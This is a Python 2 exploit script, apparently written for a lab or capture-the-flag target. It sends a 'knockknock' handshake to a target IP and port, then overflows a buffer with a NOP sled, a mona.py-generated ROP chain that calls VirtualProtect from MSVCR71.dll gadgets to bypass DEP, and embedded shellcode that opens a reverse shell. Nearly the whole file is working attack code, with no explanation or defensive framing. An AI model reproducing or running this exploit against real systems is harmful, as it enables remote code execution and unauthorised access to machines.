#!/usr/bin/python

import socket, sys, struct
# bp 184f
# bp 401912 after recv
def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        0x7c346c0a,	# POP EAX # RETN (MSVCR71.dll)
        0x7c37a140,	# Make EAX readable
        0x7c37591f,	# PUSH ESP # ... # POP ECX # POP EBP # RETN (MSVCR71.dll)
        0x41414141,	# EBP (filler)
        0x7c346c0a,	# POP EAX # RETN (MSVCR71.dll)
        0x7c37a140,	# <- *&VirtualProtect()
        0x7c3530ea,	# MOV EAX,DWORD PTR DS:[EAX] # RETN (MSVCR71.dll)
        0x7c346c0b,	# Slide, so next gadget would write to correct stack location
        0x7c376069,	# MOV [ECX+1C],EAX # P EDI # P ESI # P EBX # RETN (MSVCR71.dll)
        0x41414141,	# EDI (filler)
       	0x41414141,	# will be patched at runtime (VP), then picked up into ESI
       	0x41414141,	# EBX (filler)
        0x7c376402,	# POP EBP # RETN (msvcr71.dll)
        0x7c345c30,	# ptr to 'push esp #  ret ' (from MSVCR71.dll)
        0x7c346c0a,	# POP EAX # RETN (MSVCR71.dll)
        0xfffffdff,	# size 0x00000201 -> ebx, modify if needed
        0x7c351e05,	# NEG EAX # RETN (MSVCR71.dll)
        0x7c354901,	# POP EBX # RETN (MSVCR71.dll)
        0xffffffff,	# pop value into ebx
        0x7c345255,	# INC EBX # FPATAN # RETN (MSVCR71.dll)
        0x7c352174,	# ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN (MSVCR71.dll)
        0x7c34d201,	# POP ECX # RETN (MSVCR71.dll)
        0x7c38b001,	# RW pointer (lpOldProtect) (-> ecx)
        0x7c34b8d7,	# POP EDI # RETN (MSVCR71.dll)
        0x7c34b8d8,	# ROP NOP (-> edi)
        0x7c344f87,	# POP EDX # RETN (MSVCR71.dll)
        0xffffffc0,	# value to negate, target value : 0x00000040, target: edx
        0x7c351eb1,	# NEG EDX # RETN (MSVCR71.dll)
        0x7c346c0a,	# POP EAX # RETN (MSVCR71.dll)
        0x90909090,	# NOPS (-> eax)
        0x7c378c81,	# PUSHAD # ADD AL,0EF # RETN (MSVCR71.dll)
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

# reverse shell, 4444
shellcode="\xE8\x00\x00\x00\x00\x5A\x8D\x52\xFB\x89\xE5\x81\xEC\x00\x10\x00\x00\x52\xBB\xCC\x4B\xBC\xD6\xE8\xCA\x00\x00\x00\x5A\x55\x52\x89\xC5\x8D\xB2\x95\x01\x00\x00\x8D\xBA\xA1\x01\x00\x00\xE8\xEA\x00\x00\x00\x5A\x5D\x52\xBB\x8E\xFE\x1F\x4B\xE8\xA7\x00\x00\x00\x5A\x55\x52\x89\xC5\x8D\xB2\x81\x01\x00\x00\x8D\xBA\x8D\x01\x00\x00\xE8\xC7\x00\x00\x00\x5A\x5D\x55\x52\x31\xDB\x53\x53\x53\x31\xC9\xB1\x06\x51\x43\x53\x43\x53\x8B\x82\xA5\x01\x00\x00\xFF\xD0\x96\x5A\x5D\x55\x52\x68\x7F\x00\x00\x01\x66\x68\x11\x5C\x31\xC0\x04\x02\x66\x50\x89\xE0\x31\xC9\x51\x51\x51\x51\x6A\x10\x50\x56\x8B\x82\xA1\x01\x00\x00\xFF\xD0\x83\xC4\x08\x5A\x5D\x55\x52\xBB\x63\x63\x6D\x64\xC1\xEB\x08\x53\x89\xE7\x31\xDB\x83\xEC\x10\x89\xE3\x56\x56\x56\x31\xC9\x51\x51\x41\xC1\xC1\x08\x51\x31\xC9\x51\x51\x51\x51\x51\x51\x51\x51\x51\x51\x80\xC1\x2C\x51\x89\xE1\x53\x51\x31\xC0\x50\x50\x50\x40\x50\x48\x50\x50\x57\x50\x8B\x9A\x8D\x01\x00\x00\xFF\xD3\x5A\x5D\xFC\x31\xFF\x64\x8B\x3D\x30\x00\x00\x00\x8B\x7F\x0C\x8B\x7F\x14\x8B\x77\x28\x31\xD2\x66\xAD\x84\xC0\x74\x11\x3C\x41\x72\x06\x3C\x5A\x77\x02\x0C\x20\xC1\xC2\x07\x30\xC2\xEB\xE9\x39\xDA\x8B\x47\x10\x8B\x3F\x75\xDB\xC3\x89\xEA\x03\x52\x3C\x8B\x52\x78\x01\xEA\x8B\x5A\x20\x01\xEB\x31\xC9\x57\x56\x8B\x36\x8B\x3B\x01\xEF\x52\x31\xD2\xC1\xC2\x07\x32\x17\x47\x80\x3F\x00\x75\xF5\x92\x5A\x39\xF0\x74\x0C\x83\xC3\x04\x41\x39\x4A\x18\x75\xDF\x5E\x5F\xC3\x5E\x5F\xAD\x56\x53\x89\xEB\x89\xDE\x03\x5A\x24\x8D\x04\x4B\x0F\xB7\x00\x8D\x04\x86\x03\x42\x1C\x8B\x00\x01\xF0\xAB\x5B\x5E\x83\xC3\x04\x41\x81\x3E\xFF\xFF\x00\x00\x75\xAD\xC3\xC7\x8A\x31\x46\x19\x2B\x90\x95\xFF\xFF\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\xA1\x7E\x5A\x3E\x14\x35\xFA\xEE\xFF\xFF\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00"

if len(sys.argv) != 3:
	print "supply IP PORT"
	sys.exit(-1)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect( (sys.argv[1], int(sys.argv[2])) )

###send
message = "knockknock\n\x00"
sock.sendall(message)

###recieve
data = sock.recv(10000)
print data

###send
rop_chain = create_rop_chain()
nops_len = 1040 - len(shellcode)

exploit = "\x90" * 1040
exploit += rop_chain
exploit += shellcode

print("Sending %d bytes" %(len(exploit)))

sock.sendall(exploit)

###recieve
data = sock.recv(10000)
print data
